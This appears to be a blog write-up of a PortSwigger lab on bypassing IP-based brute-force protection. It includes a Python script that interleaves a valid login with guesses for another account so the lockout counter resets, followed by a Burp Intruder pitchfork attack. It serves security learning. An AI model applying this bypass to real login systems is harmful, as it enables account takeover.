---
title: Broken brute-force protection, IP block ( Auth Lab 4)
date: 2026-03-02
categories: [portswigger,Authentication]
---
**Platform :** Port swigger Web Security Academy

**Module :** Authentication Vulnerabilities

**Difficulty :** Practitioner

**lab url :** [Lab Link](https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/password-based-vulnerabilities/authentication/password-based/lab-broken-bruteforce-protection-ip-block#)

---

**Tools used -** 

- BurpSuite community edition

- Wordlist - 
    - [Password](https://portswigger.net/web-security/authentication/auth-lab-passwords)

**Credintials -** wiener:peter and carlos 

---

## <ins>Steps</ins>:

I tried to login with carlos account with wrong password for three attempts 

In third attempt server blocked my ip address for a minute , after a minute i tried to login with carlos account with wrong password for 2 attempt . In third attempt i login using weiner credentials 

![](/assets/images/auth-lab-4/2026-03-02_11-20.png)

Again i tried using carlos account the server did't block my ip address so, i concluded that three consecutive wrong credintials given by the user will be temporaily suspend by the server for a minute .

for brute force attck i used python script for genrating username and password payload

```python
print("##########################Username##################")

for i in range(150):
    if i % 3 :
        print("carlos")
    else:
        print("wiener")

print("################Password#######################")

with open("pass.txt", 'r') as f:
    lines= f.readlines()

i = 0
for pwd in lines:
    if i % 3:
        print(pwd.strip('\n'))
    else:
        print("peter")
        print(pwd.strip('\n'))
        i=i+1
    i=i+1

```
In intruder section, i am selecting **pitchfork attack** for bruteforcing both username and password 

![](/assets/images/auth-lab-4/2026-03-02_11-21.png)

After the attack is finished, examine the status code in result tab. we can sort the status code by using column header. 

![](/assets/images/auth-lab-4/2026-03-02_11-21_1.png)



